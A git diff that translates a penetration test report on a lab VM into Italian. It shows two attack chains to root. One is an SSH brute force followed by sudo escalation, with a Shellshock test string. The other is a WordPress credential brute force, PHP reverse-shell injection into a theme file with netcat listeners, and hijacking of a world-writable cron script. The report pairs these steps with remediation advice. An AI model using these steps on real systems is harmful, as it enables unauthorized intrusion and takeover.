@@ -1,30 +1,30 @@
-# Black Box Penetration Test Report
+# Report di Penetration Test Black Box
 
 **Target:** 192.168.50.9  
-**Test Type:** Black Box Penetration Test  
-**Tester:** [Your Name]  
-**Date:** January 27, 2026  
-**Status:** CONFIDENTIAL
+**Tipo di Test:** Penetration Test Black Box  
+**Tester:** [Nome del Tester]  
+**Data:** 27 Gennaio 2026  
+**Stato:** CONFIDENZIALE
 
 ---
 
-## Executive Summary
+## Sommario Esecutivo
 
-Durante il black box penetration test condotto sul sistema target 192.168.50.9, sono state identificate **vulnerabilità critiche** che hanno permesso la completa compromissione del sistema attraverso **due attack path distinti**:
+Durante il penetration test black box condotto sul sistema target 192.168.50.9, sono state identificate **vulnerabilità critiche** che hanno permesso la completa compromissione del sistema attraverso **due percorsi di attacco distinti**:
 
-### Attack Path 1: SSH Brute Force + Sudo Misconfiguration
+### Percorso di Attacco 1: Brute Force SSH + Configurazione Sudo Errata
 1. **Accesso FTP anonimo** con information disclosure (lista utenti)
 2. **Credenziali SSH deboli** individuate tramite brute force (anne:princess)
 3. **Privilege escalation** tramite configurazione sudo non sicura
 4. **Vulnerabilità Shellshock** (CVE-2014-6271) identificata post-compromissione
 
-### Attack Path 2: WordPress Exploitation + Cron Job Hijacking
-1. **WordPress installation discovery** tramite robots.txt
-2. **WordPress credentials brute force** (john:enigma)
-3. **PHP Reverse Shell injection** tramite Theme Editor
+### Percorso di Attacco 2: Exploitation WordPress + Hijacking Cron Job
+1. **Scoperta installazione WordPress** tramite robots.txt
+2. **Brute force credenziali WordPress** (john:enigma)
+3. **Iniezione PHP Reverse Shell** tramite Theme Editor
 4. **Privilege escalation** via cron job world-writable (/usr/local/bin/cleanup)
 
-Entrambi i path hanno portato a **ROOT ACCESS COMPLETO**. Il sistema presenta un **livello di rischio CRITICO** e richiede interventi immediati di remediation.
+Entrambi i percorsi hanno portato ad **ACCESSO ROOT COMPLETO**. Il sistema presenta un **livello di rischio CRITICO** e richiede interventi immediati di remediation.
 
 ---
 
@@ -32,128 +32,128 @@ Entrambi i path hanno portato a **ROOT ACCESS COMPLETO**. Il sistema presenta un
 
 Il test è stato condotto seguendo una metodologia black box standard:
 
-1. **Reconnaissance & Host Discovery**
+1. **Ricognizione e Scoperta Host**
 2. **Vulnerability Assessment** (scansioni non autenticate)
-3. **Service Enumeration**
+3. **Enumerazione Servizi**
 4. **Exploitation**
-5. **Post-Exploitation & Privilege Escalation**
-6. **Credentialed Vulnerability Assessment**
+5. **Post-Exploitation e Privilege Escalation**
+6. **Vulnerability Assessment Autenticato**
 
 ---
 
-## Scope del Test
+## Ambito del Test
 
-**Target Systems:**
+**Sistemi Target:**
 - 192.168.50.9 (Linux Ubuntu 12.04 LTS)
 
-**IP Range Scanned:**
+**Range IP Scansionato:**
 - 192.168.0.0/16
 
-**Excluded Systems:**
+**Sistemi Esclusi:**
 - Nessuno
 
 ---
 
-## Findings Summary
+## Riepilogo Vulnerabilità
 
-| Severity | Count | Description |
-|----------|-------|-------------|
-| **CRITICAL** | 5 | End of Life OS, Bash RCE (Shellshock), WordPress Admin Access, Theme Editor RCE, World-Writable Cron Job |
-| **HIGH** | 2 | Weak WordPress Credentials, Anonymous FTP Access |
-| **MEDIUM** | 4 | Apache, MySQL, SSH Multiple Issues |
-| **LOW** | 1 | ICMP Timestamp Disclosure |
-| **INFO** | Multiple | Service detection, port scanners detected |
+| Gravità | Conteggio | Descrizione |
+|---------|-----------|-------------|
+| **CRITICA** | 5 | OS End of Life, Bash RCE (Shellshock), Accesso Admin WordPress, RCE Theme Editor, Cron Job World-Writable |
+| **ALTA** | 2 | Credenziali WordPress Deboli, Accesso FTP Anonimo |
+| **MEDIA** | 4 | Apache, MySQL, SSH - Problematiche Multiple |
+| **BASSA** | 1 | ICMP Timestamp Disclosure |
+| **INFO** | Multiple | Rilevamento servizi, port scanner rilevati |
 
 ---
 
-## Detailed Attack Path
+## Percorso di Attacco Dettagliato
 
-### Phase 1: Reconnaissance & Host Discovery
+### Fase 1: Ricognizione e Scoperta Host
 
-**Tool:** netdiscover / ARP scanning  
-**Command:**
+**Strumento:** netdiscover / scansione ARP  
+**Comando:**
 ```bash
 netdiscover -r 192.168.0.0/16
 ```
 
-**Results:**
-- **Target Identified:** 192.168.50.9
-- **MAC Address:** 08:00:27:f3:f2:8b
+**Risultati:**
+- **Target Identificato:** 192.168.50.9
+- **Indirizzo MAC:** 08:00:27:f3:f2:8b
 - **Vendor:** PCS Systemtechnik GmbH (VirtualBox)
-- **Total Hosts:** 14 hosts discovered in the network
+- **Host Totali:** 14 host scoperti nella rete
 
-**Analysis:**  
+**Analisi:**  
 La scansione ARP ha identificato con successo il target nel range di rete specificato.
 
 ---
 
-### Phase 2: Initial Vulnerability Assessment (Uncredentialed)
+### Fase 2: Vulnerability Assessment Iniziale (Non Autenticato)
 
-**Tool:** Nessus Professional  
-**Scan Type:** Basic Network Scan (Uncredentialed)  
-**Duration:** ~8 minutes
+**Strumento:** Nessus Professional  
+**Tipo di Scansione:** Basic Network Scan (Non Autenticata)  
+**Durata:** ~8 minuti
 
-**Vulnerabilities Detected:**
+**Vulnerabilità Rilevate:**
 
-#### CRITICAL - Canonical Ubuntu Linux End of Life (12.04.x)
+#### CRITICA - Canonical Ubuntu Linux End of Life (12.04.x)
 - **CVSS:** 10.0
 - **Plugin ID:** N/A
-- **Description:** Il sistema operativo Ubuntu 12.04 LTS ha raggiunto l'end of life e non riceve più aggiornamenti di sicurezza
-- **Impact:** Vulnerabilità note non patchate, esposizione ad exploit pubblici
+- **Descrizione:** Il sistema operativo Ubuntu 12.04 LTS ha raggiunto l'end of life e non riceve più aggiornamenti di sicurezza
+- **Impatto:** Vulnerabilità note non patchate, esposizione ad exploit pubblici
 - **Remediation:** Upgrade immediato a una versione supportata di Ubuntu (20.04 LTS o 22.04 LTS)
 
-#### MIXED Severity Issues:
-- **Apache HTTP Server** (Multiple Issues) - 3 vulnerabilities
-- **Oracle MySQL** (Multiple Issues) - 5 vulnerabilities  
-- **SSH** (Multiple Issues) - 6 vulnerabilities (Misc category)
-- **Canonical Ubuntu Linux** (Multiple Issues) - 58 local security checks
+#### Problematiche di Gravità Mista:
+- **Apache HTTP Server** (Problematiche Multiple) - 3 vulnerabilità
+- **Oracle MySQL** (Problematiche Multiple) - 5 vulnerabilità  
+- **SSH** (Problematiche Multiple) - 6 vulnerabilità (categoria Misc)
+- **Canonical Ubuntu Linux** (Problematiche Multiple) - 58 controlli di sicurezza locali
 
-#### LOW:
+#### BASSA:
 - **ICMP Timestamp Request Remote Date Disclosure** (CVSS 2.1)
   - Permette di determinare l'ora del sistema target
 
 #### INFO:
-- HTTP Service Detection - 3 issues
-- SSH Service Detection - 9 issues
-- Netstat Portscanner (SSH) - 7 detections
-- Service Detection - 3 detections
+- Rilevamento Servizio HTTP - 3 problematiche
+- Rilevamento Servizio SSH - 9 problematiche
+- Netstat Portscanner (SSH) - 7 rilevamenti
+- Rilevamento Servizi - 3 rilevamenti
 
 ---
 
-### Phase 3: Network Service Enumeration
+### Fase 3: Enumerazione Servizi di Rete
 
-**Tool:** Nmap  
-**Command:**
+**Strumento:** Nmap  
+**Comando:**
 ```bash
 nmap -sV -p- --script vuln 192.168.50.9
 ```
 
-**Open Ports & Services:**
+**Porte Aperte & Servizi:**
 
-| Port | Protocol | Service | Version |
+| Porta | Protocollo | Servizio | Versione |
 |------|----------|---------|---------|
 | 21 | TCP | FTP | vsftpd 2.3.5 |
 | 22 | TCP | SSH | OpenSSH 5.9p1 Debian 5ubuntu1.10 |
 | 80 | TCP | HTTP | Apache httpd 2.2.22 ((Ubuntu)) |
 
-**Key Findings:**
+**Risultati Chiave:**
 - **FTP Anonymous Login Allowed** (vsftpd 2.3.5)
 - **HTTP Server:** Apache/2.2.22 - vulnerable, no robots.txt
 - **SSH Server:** OpenSSH 5.9p1 - versione datata
 
-**Nmap Vulnerability Scan Results:**
+**Risultati Scansione Vulnerabilità Nmap:**
 - Confermate le vulnerabilità rilevate da Nessus
 - Identificata configurazione FTP non sicura
 
 ---
 
-### Phase 4: Exploitation - FTP Anonymous Access
+### Fase 4: Exploitation - Accesso FTP Anonimo
 
-**Tool:** FTP Client  
+**Strumento:** FTP Client  
 **Vulnerability:** Anonymous FTP Login Enabled  
-**Severity:** MEDIUM
+**Gravità:** MEDIUM
 
-**Exploitation Steps:**
+**Passaggi di Exploitation:**
 
 ```bash
 ftp 192.168.50.9
@@ -161,7 +161,7 @@ Name: anonymous
 Password: [enter]
 ```
 
-**Results:**
+**Risultati:**
 ```
 230 Login successful.
 Remote system type is UNIX.
@@ -173,7 +173,7 @@ drwxr-xr-x    2 65534   65534       4096 Mar 03  2018 public
 226 Directory send OK.
 ```
 
-**Files Discovered:**
+**File Scoperti:**
 ```bash
 ftp> cd public
 ftp> ls
@@ -190,7 +190,7 @@ anne
 doomguy
 ```
 
-**Impact:**  
+**Impatto:**  
 Information disclosure critico - la lista di utenti validi del sistema è stata esposta tramite FTP anonimo. Questa informazione può essere utilizzata per attacchi di brute force mirati.
 
 **Remediation:**
@@ -200,9 +200,9 @@ Information disclosure critico - la lista di utenti validi del sistema è stata 
 
 ---
 
-### Phase 5: SSH Brute Force Attack
+### Fase 5: Attacco Brute Force SSH
 
-**Tool:** Hydra  
+**Strumento:** Hydra  
 **Target Service:** SSH (port 22)  
 **Attack Type:** Dictionary-based brute force
 
@@ -212,17 +212,17 @@ hydra -L users.txt.bk -P /usr/share/seclists/Passwords/Common-Credentials/500-wo
 192.168.50.9 ssh
 ```
 
-**Error Encountered:**
+**Errore Riscontrato:**
 ```
 [ERROR] target ssh://192.168.50.9:22/ does not support password authentication (method reply 4).
 ```
 
-**Root Cause:**  
+**Causa Principale:**  
 Molte configurazioni SSH limitano il numero di tentativi di autenticazione paralleli. È stato necessario ridurre il numero di task paralleli.
 
 ---
 
-### Phase 6: SSH Manual Testing
+### Fase 6: Test Manuali SSH
 
 **Manual verification** degli utenti tramite connessione SSH diretta per verificare la risposta del server:
 
@@ -234,7 +234,7 @@ ssh anne@192.168.50.9     # Password prompt received
 ssh doomguy@192.168.50.9  # Permission denied (publickey)
 ```
 
-**Key Finding:**  
+**Risultato Chiave:**  
 Solo l'utente **anne** accetta l'autenticazione tramite password, gli altri utenti richiedono autenticazione a chiave pubblica.
 
 **Note di Sicurezza:**  
@@ -246,34 +246,34 @@ This session may be vulnerable to "store now, decrypt later" attacks.
 
 ---
 
-### Phase 7: Successful SSH Brute Force (User: anne)
+### Fase 7: Brute Force SSH Riuscito (Utente: anne)
 
-**Tool:** Hydra (optimized parameters)  
-**Command:**
+**Strumento:** Hydra (optimized parameters)  
+**Comando:**
 ```bash
 hydra -l anne -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt \
 192.168.50.9 ssh -t 4 -V -C
 ```
 
-**Parameters:**
+**Parametri:**
 - `-l anne`: singolo username
 - `-P`: password wordlist
 - `-t 4`: ridotto a 4 task paralleli per evitare blocking
 - `-V`: verbose mode
 - `-C`: continue mode
 
-**Results:**
+**Risultati:**
 ```
 [22][ssh] host: 192.168.50.9   login: anne   password: princess
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-**Credentials Obtained:**
+**Credenziali Ottenute:**
 - **Username:** anne
 - **Password:** princess
 
-**Severity:** CRITICAL  
-**Impact:** Compromissione completa dell'account utente tramite password debole.
+**Gravità:** CRITICAL  
+**Impatto:** Compromissione completa dell'account utente tramite password debole.
 
 **Remediation:**
 - Implementare policy di password complesse
@@ -283,16 +283,16 @@ hydra -l anne -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-pass
 
 ---
 
-### Phase 8: Initial Access & System Information Gathering
+### Fase 8: Accesso Iniziale e Raccolta Informazioni Sistema
 
-**Access Method:** SSH  
+**Metodo di Accesso:** SSH  
 **Credentials:** anne:princess
 
 ```bash
 ssh anne@192.168.50.9
 ```
 
-**System Information:**
+**Informazioni Sistema:**
 ```
 Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)
 
@@ -307,13 +307,13 @@ Run 'do-release-upgrade' to upgrade to it.
 Last login: Sun Mar  4 16:14:55 2018 from 192.168.1.68
 ```
 
-**Key Observations:**
+**Osservazioni Chiave:**
 - **OS:** Ubuntu 12.04.4 LTS (End of Life)
 - **Kernel:** Linux 3.11.0-15-generic i686
 - **Updates Available:** 382 packages (275 security updates)
 - Sistema gravemente non aggiornato
 
-**Initial Enumeration:**
+**Enumerazione Iniziale:**
 ```bash
 anne@bsides2018:~$ whoami
 anne
@@ -324,10 +324,10 @@ uid=1002(anne) gid=1002(anne) groups=1002(anne)
 
 ---
 
-### Phase 9: Privilege Escalation to Root
+### Fase 9: Privilege Escalation a Root
 
 **Method:** Sudo misconfiguration  
-**Severity:** CRITICAL
+**Gravità:** CRITICAL
 
 **Discovery:**
 ```bash
@@ -355,14 +355,14 @@ root@bsides2018:~# whoami
 root
 ```
 
-**Impact:** CRITICAL  
+**Impatto:** CRITICAL  
 L'utente **anne** ha privilegi sudo completi senza restrizioni, permettendo l'escalation immediata a root.
 
 **Vulnerability Details:**
 - **Affected User:** anne
 - **Sudo Configuration:** (ALL : ALL) ALL
 - **Authentication Required:** Yes (password utente)
-- **Impact:** Complete system compromise
+- **Impatto:** Complete system compromise
 
 **Remediation:**
 - Rimuovere i privilegi sudo dall'utente anne o limitarli a comandi specifici
@@ -373,9 +373,9 @@ L'utente **anne** ha privilegi sudo completi senza restrizioni, permettendo l'es
 
 ---
 
-### Phase 10: Post-Exploitation - Credentialed Vulnerability Scan
+### Fase 10: Post-Exploitation - Scansione Vulnerabilità Autenticata
 
-**Tool:** Nessus Professional  
+**Strumento:** Nessus Professional  
 **Scan Type:** Credentialed Scan  
 **Credentials Used:** anne:princess (with sudo privileges)  
 **Duration:** ~7 minutes
@@ -388,7 +388,7 @@ L'utente **anne** ha privilegi sudo completi senza restrizioni, permettendo l'es
 - **Plugin ID:** Bash Shellshock Detection
 - **Family:** Gain a shell remotely
 
-**Description:**  
+**Descrizione:**  
 Il sistema è vulnerabile a Shellshock (CVE-2014-6271), una vulnerabilità critica in GNU Bash che permette l'esecuzione di codice arbitrario da remoto. Questa vulnerabilità è stata scoperta nel 2014 e colpisce versioni di Bash anteriori alla patch.
 
 **Technical Details:**
@@ -408,7 +408,7 @@ env x='() { :;}; echo vulnerable' bash -c "echo test"
 ```
 Se il sistema restituisce "vulnerable", il sistema è compromettibile.
 
-**Impact:**  
+**Impatto:**  
 Un attaccante remoto può eseguire comandi arbitrari con i privilegi del processo Bash vulnerabile, potenzialmente ottenendo accesso completo al sistema senza autenticazione.
 
 **Remediation:**
@@ -440,21 +440,21 @@ sudo apt-get install --only-upgrade bash
 
 **Total Vulnerabilities:** 143 (vs 48 in uncredentialed scan)
 
-**Key Findings:**
+**Risultati Chiave:**
 - L'autenticazione ha permesso di identificare **95 vulnerabilità aggiuntive** non visibili senza credenziali
 - Il numero di vulnerabilità CRITICAL è aumentato da 2 a 15
 - Identificate vulnerabilità nel kernel, nelle librerie di sistema, e nei pacchetti installati
 
 ---
 
-## Alternative Attack Path #2: WordPress Exploitation
+## Percorso di Attacco Alternativo #2: Exploitation WordPress
 
 Oltre al primo path di attacco tramite SSH, è stato identificato un **secondo vettore di attacco completamente indipendente** attraverso un'installazione WordPress non sicura presente sullo stesso host.
 
-### Phase 11: Web Service Enumeration - robots.txt Discovery
+### Fase 11: Enumerazione Servizi Web - Scoperta robots.txt
 
-**Tool:** Nmap  
-**Command:**
+**Strumento:** Nmap  
+**Comando:**
 ```bash
 nmap -sV -sC 192.168.50.6
 ```
@@ -471,17 +471,17 @@ PORT   STATE SERVICE VERSION
 |_/backup_wordpress
 ```
 
-**Analysis:**  
+**Analisi:**  
 Il file robots.txt rivela la presenza di una directory nascosta `/backup_wordpress`, indicando un'installazione WordPress backup o di test non adeguatamente protetta.
 
-**Impact:** MEDIUM  
+**Impatto:** MEDIUM  
 Information disclosure che rivela la struttura delle directory e potenziali vettori di attacco.
 
 ---
 
-### Phase 12: WordPress Installation Discovery
+### Fase 12: Scoperta Installazione WordPress
 
-**Access Method:** Browser  
+**Metodo di Accesso:** Browser  
 **URL:** http://192.168.50.6/backup_wordpress
 
 **Findings:**
@@ -494,25 +494,25 @@ Information disclosure che rivela la struttura delle directory e potenziali vett
 - **Date:** March 7, 2018
 - **Contact:** "For any questions, please contact IT administrator john."
 
-**Key Observations:**
+**Osservazioni Chiave:**
 - WordPress installation attiva ma "deprecated"
 - Username valido identificato: **john**
 - Possibile target per brute force attack
 - WordPress versione 4.5 (rilevata successivamente)
 
-**Security Issues:**
+**Problematiche di Sicurezza:**
 - Blog non rimosso dopo il "retirement"
 - Username esposto pubblicamente
 - Nessuna autenticazione richiesta per la lettura
 
 ---
 
-### Phase 13: WordPress Login Page Enumeration
+### Fase 13: Enumerazione Pagina Login WordPress
 
-**Tool:** Metasploit Framework  
+**Strumento:** Metasploit Framework  
 **Module:** `auxiliary/scanner/http/wordpress_login_enum`
 
-**Configuration:**
+**Configurazione:**
 ```bash
 msf > use auxiliary/scanner/http/wordpress_login_enum
 msf auxiliary(scanner/http/wordpress_login_enum) > set RHOSTS 192.168.50.9
@@ -535,9 +535,9 @@ msf auxiliary(scanner/http/wordpress_login_enum) > run
 
 ---
 
-### Phase 14: WordPress Credentials Brute Force
+### Fase 14: Brute Force Credenziali WordPress
 
-**Tool:** Metasploit Framework  
+**Strumento:** Metasploit Framework  
 **Module:** `auxiliary/scanner/http/wordpress_login_enum`  
 **Username:** john (identificato dalla fase precedente)  
 **Wordlist:** /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
@@ -561,15 +561,15 @@ Matching Modules
 [*] Auxiliary module execution completed
 ```
 
-**Credentials Obtained:**
+**Credenziali Ottenute:**
 - **Username:** john
 - **Password:** enigma
 - **Access Level:** WordPress Administrator
 
-**Severity:** CRITICAL  
-**Impact:** Accesso amministrativo completo al pannello WordPress, permettendo l'esecuzione di codice arbitrario.
+**Gravità:** CRITICAL  
+**Impatto:** Accesso amministrativo completo al pannello WordPress, permettendo l'esecuzione di codice arbitrario.
 
-**Vulnerability Analysis:**
+**Analisi della Vulnerabilità:**
 - Password debole (presente in common wordlist)
 - Nessun rate limiting sui tentativi di login
 - Nessuna protezione contro brute force (no fail2ban, no CAPTCHA)
@@ -577,9 +577,9 @@ Matching Modules
 
 ---
 
-### Phase 15: WordPress Admin Panel Access
+### Fase 15: Accesso Pannello Admin WordPress
 
-**Access Method:** Web Browser  
+**Metodo di Accesso:** Web Browser  
 **URL:** http://192.168.50.9/backup_wordpress/wp-login.php  
 **Credentials:** john:enigma
 
@@ -600,7 +600,7 @@ Password: ••••••
 
 ---
 
-### Phase 16: WordPress Dashboard Enumeration
+### Fase 16: Enumerazione Dashboard WordPress
 
 **WordPress Version Information:**
 ```
@@ -630,7 +630,7 @@ WordPress 4.5 running Twenty Sixteen theme.
 
 ---
 
-### Phase 17: Theme Editor Access for Code Injection
+### Fase 17: Accesso Theme Editor per Iniezione Codice
 
 **Navigation:** Appearance → Editor  
 **Target File:** Twenty Sixteen: Theme Footer (footer.php)
@@ -661,9 +661,9 @@ Iniettare una reverse shell PHP nel file footer.php che verrà eseguito ad ogni 
 
 ---
 
-### Phase 18: PHP Reverse Shell Injection
+### Fase 18: Iniezione PHP Reverse Shell
 
-**Tool:** Theme Editor (WordPress Admin Panel)  
+**Strumento:** Theme Editor (WordPress Admin Panel)  
 **Target File:** footer.php  
 **Payload:** PHP Reverse Shell
 
@@ -689,15 +689,15 @@ $debug = 0;
 **Code Placement:**
 Il codice della reverse shell è stato inserito all'inizio del file footer.php, garantendo l'esecuzione automatica ogni volta che una pagina del sito viene caricata.
 
-**Severity:** CRITICAL  
-**Impact:** Remote Code Execution (RCE) come utente www-data sul server web.
+**Gravità:** CRITICAL  
+**Impatto:** Remote Code Execution (RCE) come utente www-data sul server web.
 
 ---
 
-### Phase 19: Netcat Listener Setup
+### Fase 19: Configurazione Listener Netcat
 
-**Tool:** Netcat  
-**Command:**
+**Strumento:** Netcat  
+**Comando:**
 ```bash
 nc -lvnp 4444
 ```
@@ -707,7 +707,7 @@ nc -lvnp 4444
 listening on [any] 4444 ...
 ```
 
-**Configuration:**
+**Configurazione:**
 - `-l`: Listen mode
 - `-v`: Verbose output
 - `-n`: No DNS resolution
@@ -718,7 +718,7 @@ Il listener è in attesa che qualcuno carichi una pagina del WordPress blog, tri
 
 ---
 
-### Phase 20: Reverse Shell Connection Established
+### Fase 20: Connessione Reverse Shell Stabilita
 
 **Trigger:** Navigazione su qualsiasi pagina WordPress  
 **URL Example:** http://192.168.50.9/backup_wordpress/
@@ -751,11 +751,11 @@ www-data
 
 ---
 
-### Phase 21: Post-Exploitation Enumeration - Cron Jobs Discovery
+### Fase 21: Enumerazione Post-Exploitation - Scoperta Cron Job
 
-**Objective:** Privilege escalation from www-data to root
+**Obiettivo:** Privilege escalation from www-data to root
 
-**System Enumeration:**
+**Enumerazione Sistema:**
 ```bash
 $ cat /etc/crontab
 # /etc/crontab: system-wide crontab
@@ -780,13 +780,13 @@ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 *  *    * * *   root    /usr/local/bin/cleanup
 ```
 
-**Analysis:**
+**Analisi:**
 - Script eseguito **ogni minuto** come **root**
 - Potenziale vettore per privilege escalation se modificabile
 
 ---
 
-### Phase 22: Cron Script Permissions Analysis
+### Fase 22: Analisi Permessi Script Cron
 
 **Script Examination:**
 ```bash
@@ -801,7 +801,7 @@ $ ls -la /usr/local/bin/cleanup
 
 **CRITICAL SECURITY ISSUE:**
 
-**Permissions:** `-rwxrwxrwx` (777)
+**Permessi:** `-rwxrwxrwx` (777)
 - **Owner:** root
 - **Group:** root
 - **World-writable:** YES (!!!)
@@ -811,7 +811,7 @@ $ ls -la /usr/local/bin/cleanup
 - Permessi 777 = qualsiasi utente può modificare il file
 - Perfect privilege escalation vector
 
-**Impact:** CRITICAL  
+**Impatto:** CRITICAL  
 Qualsiasi utente sul sistema (incluso www-data) può modificare questo script e ottenere esecuzione di comandi come root.
 
 **Exploitation Plan:**
@@ -821,10 +821,10 @@ Qualsiasi utente sul sistema (incluso www-data) può modificare questo script e 
 
 ---
 
-### Phase 23: Setting Up Root Shell Listener
+### Fase 23: Configurazione Listener per Shell Root
 
-**Tool:** Netcat  
-**Command:**
+**Strumento:** Netcat  
+**Comando:**
 ```bash
 nc -lvnp 443
 ```
@@ -841,9 +841,9 @@ listening on [any] 443 ...
 
 ---
 
-### Phase 24: Malicious Script Injection
+### Fase 24: Iniezione Script Malevolo
 
-**Action:** Modifica del cron script per privilege escalation
+**Azione:** Modifica del cron script per privilege escalation
 
 **Original Content:**
 ```bash
@@ -874,7 +874,7 @@ Il cron job esegue lo script ogni minuto. Entro 60 secondi, il sistema eseguirà
 
 ---
 
-### Phase 25: Root Access Achieved
+### Fase 25: Accesso Root Ottenuto
 
 **Connection Received:**
 ```bash
@@ -889,7 +889,7 @@ root
 
 **ROOT SHELL OBTAINED:**
 - **User:** root (uid=0)
-- **Access Method:** Cron job exploitation
+- **Metodo di Accesso:** Cron job exploitation
 - **Shell Type:** Interactive /bin/sh
 - **Full System Compromise:** YES
 
@@ -911,11 +911,11 @@ Completa compromissione del sistema tramite:
 
 ---
 
-## Risk Analysis
+## Analisi del Rischio
 
-### Overall Risk Rating: CRITICAL
+### Valutazione Complessiva del Rischio: CRITICA
 
-**Likelihood:** VERY HIGH  
+**Probabilità:** VERY HIGH  
 - Sistema esposto con servizi vulnerabili multipli
 - Credenziali deboli su servizi critici (SSH + WordPress)
 - FTP anonimo abilitato con information disclosure
@@ -924,7 +924,7 @@ Completa compromissione del sistema tramite:
 - World-writable cron job eseguito come root (Path 2)
 - **Due vettori di attacco indipendenti** entrambi portano a root
 
-**Impact:** CRITICAL  
+**Impatto:** CRITICAL  
 - Compromissione completa del sistema (root access via 2 path distinti)
 - Possibile lateral movement nella rete
 - Potenziale data breach e perdita di confidenzialità
@@ -932,7 +932,7 @@ Completa compromissione del sistema tramite:
 - Persistenza ottenibile tramite backdoor, cron jobs, SSH keys
 - Possibile uso come pivot point per attacchi ad altri sistemi
 
-### Attack Chain Summary - Path 1 (SSH)
+### Riepilogo Catena di Attacco - Percorso 1 (SSH)
 
 ```
 [1] FTP Anonymous Access
@@ -952,9 +952,9 @@ Completa compromissione del sistema tramite:
 [8] Shellshock Vulnerability Confirmed (Post-Exploitation)
 ```
 
-**Time to Compromise:** < 2 ore
+**Tempo per Compromissione:** < 2 ore
 
-### Attack Chain Summary - Path 2 (WordPress)
+### Riepilogo Catena di Attacco - Percorso 2 (WordPress)
 
 ```
 [11] robots.txt Discovery
@@ -980,11 +980,11 @@ Completa compromissione del sistema tramite:
 [21] ROOT ACCESS ACHIEVED
 ```
 
-**Time to Compromise:** 15-20 minuti
+**Tempo per Compromissione:** 15-20 minuti
 
-### Combined Risk Assessment
+### Valutazione Rischio Combinata
 
-**Multiple Independent Attack Vectors:**
+**Vettori di Attacco Indipendenti Multipli:**
 Il sistema presenta **almeno due path completamente indipendenti** per ottenere root access, aumentando drasticamente la probabilità di compromissione:
 
 1. Se un amministratore corregge solo le vulnerabilità SSH, l'attaccante può usare WordPress
@@ -992,21 +992,21 @@ Il sistema presenta **almeno due path completamente indipendenti** per ottenere 
 3. Entrambi i path sono facilmente exploitable con tool pubblici
 4. Entrambi i path richiedono solo credenziali deboli come entry point
 
-**Defense Evasion:**
+**Evasione delle Difese:**
 - Diversi servizi compromessi (SSH, HTTP, Cron)
 - Molte possibilità di persistenza
 - Lateral movement facilitato da credenziali multiple
 
-**Business Impact:**
+**Impatto sul Business:**
 - **Confidentiality:** CRITICAL - Accesso completo a tutti i dati del sistema
 - **Integrity:** CRITICAL - Possibilità di modificare qualsiasi file/database
 - **Availability:** CRITICAL - Possibilità di causare DoS o distruggere il sistema
 
 ---
 
-## Recommendations
+## Raccomandazioni
 
-### Immediate Actions (Priority 1 - 24-48 hours)
+### Azioni Immediate (Priorità 1 - 24-48 ore)
 
 1. **Disabilitare l'accesso FTP anonimo**
    ```bash
@@ -1078,7 +1078,7 @@ Il sistema presenta **almeno due path completamente indipendenti** per ottenere 
    # Add WordPress jail configuration
    ```
 
-### Short Term Actions (Priority 2 - 1-2 weeks)
+### Azioni a Breve Termine (Priorità 2 - 1-2 settimane)
 
 9. **Aggiornare WordPress all'ultima versione**
    ```bash
@@ -1154,7 +1154,7 @@ Il sistema presenta **almeno due path completamente indipendenti** per ottenere 
     - Limitare l'accesso SSH a IP whitelisted
     - Limitare accesso WordPress admin a IP specifici
 
-### Long Term Actions (Priority 3 - 1-3 months)
+### Azioni a Lungo Termine (Priorità 3 - 1-3 mesi)
 
 18. **Pianificare migrazione a Ubuntu 22.04 LTS**
     - Ubuntu 12.04 è End of Life dal 2017
@@ -1209,7 +1209,7 @@ Il sistema presenta **almeno due path completamente indipendenti** per ottenere 
 
 ---
 
-## Compliance Considerations
+## Considerazioni di Conformità
 
 Il sistema presenta violazioni di:
 - **NIST Cybersecurity Framework:** Funzioni di Protezione e Rilevamento non implementate
@@ -1219,22 +1219,22 @@ Il sistema presenta violazioni di:
 
 ---
 
-## Appendix A: Tools Used
+## Appendice A: Strumenti Utilizzati
 
-| Tool | Version | Purpose |
+| Strumento | Versione | Scopo |
 |------|---------|---------|
-| netdiscover | Latest | ARP-based host discovery |
-| Nessus Professional | Latest | Vulnerability scanning |
-| Nmap | 7.x+ | Port scanning & service enumeration |
-| Hydra | 9.x+ | Password brute forcing |
-| FTP Client | Built-in | FTP enumeration |
-| OpenSSH Client | Latest | SSH access |
+| netdiscover | Latest | Scoperta host basata su ARP |
+| Nessus Professional | Latest | Scansione vulnerabilità |
+| Nmap | 7.x+ | Scansione porte ed enumerazione servizi |
+| Hydra | 9.x+ | Brute force password |
+| FTP Client | Integrato | Enumerazione FTP |
+| OpenSSH Client | Latest | Accesso SSH |
 
 ---
 
-## Appendix B: Evidence Files
+## Appendice B: File di Evidenza
 
-### Attack Path 1: SSH Exploitation (Screenshots 1-10)
+### Percorso di Attacco 1: Exploitation SSH (Screenshot 1-10)
 
 1. `1_host_discovery.png` - Screenshot della scansione ARP network discovery
 2. `2_1_nessu_uncredentialed_scan_1.png` - Risultati Nessus scan non autenticato (host 192.168.50.6)
@@ -1249,7 +1249,7 @@ Il sistema presenta violazioni di:
 11. `10_1_nessus_credentialed_scan_1.png` - Risultati Nessus scan autenticato
 12. `10_nessu_credentialed_scan_2.png` - Dettaglio vulnerabilità Shellshock
 
-### Attack Path 2: WordPress Exploitation (Screenshots 11-27)
+### Percorso di Attacco 2: Exploitation WordPress (Screenshot 11-27)
 
 11. `11_nmap_vuln_robots.png` - Nmap scan con discovery di robots.txt
 12. `12_robots_txt.png` - Contenuto robots.txt con /backup_wordpress
@@ -1271,7 +1271,7 @@ Il sistema presenta violazioni di:
 
 ---
 
-## Appendix C: CVSS Scores Reference
+## Appendice C: Riferimento Punteggi CVSS
 
 **CVSS v3.0 Severity Scale:**
 - **CRITICAL:** 9.0 - 10.0
@@ -1286,73 +1286,73 @@ Il sistema presenta violazioni di:
 
 ---
 
-## Conclusion
+## Conclusione
 
 Il penetration test ha dimostrato che il sistema target 192.168.50.9 presenta **vulnerabilità critiche multiple** su diversi livelli che permettono la completa compromissione del sistema attraverso **due attack path completamente indipendenti**, entrambi portando a root access in tempi estremamente brevi.
 
-### Key Findings Summary
+### Riepilogo Risultati Chiave
 
-**Attack Path 1 - SSH (Time to Root: < 2 ore):**
+**Percorso di Attacco 1 - SSH (Tempo per Root: < 2 ore):**
